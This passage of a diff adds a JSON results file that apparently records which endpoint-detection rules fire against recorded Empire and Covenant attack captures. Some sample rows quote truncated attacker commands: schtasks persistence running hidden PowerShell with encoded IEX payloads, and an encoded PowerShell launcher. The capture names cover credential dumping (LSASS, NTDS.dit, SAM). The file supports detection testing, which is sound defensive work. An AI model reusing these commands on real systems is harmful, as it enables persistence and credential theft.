+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /RU system /SC ONLOGON /TN MordorElevated /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert",
+     "by": "powershell.exe",
+     "score": "110"
+    }
+   ]
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::F",
+     "by": "powershell.exe",
+     "score": "80"
+    }
+   ]
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "schtask_create",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "schtasks  /create /F /tn \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager /tr \"C:\\Windows\\system32\\cmd.exe /C C:\\Windows\\System32\\notepad.exe\" /sc ONSTART /ru system /S WORKSTATION6",
+     "by": "cmd.exe",
+     "score": "110"
+    }
+   ]
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": true,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "HIGH"
+    }
+   ]
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmi_fileless_scrcons_consumer",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceNetworkEvents",
+    "DeviceImageLoadEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAG8ATgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAA0ADMAZABlADIAPQBbAHIAZQBGAF0AL",
+     "score": "CRITICAL"
+    }
+   ]
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "wmiprvse_remote_execution",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  }
+ ]
+}
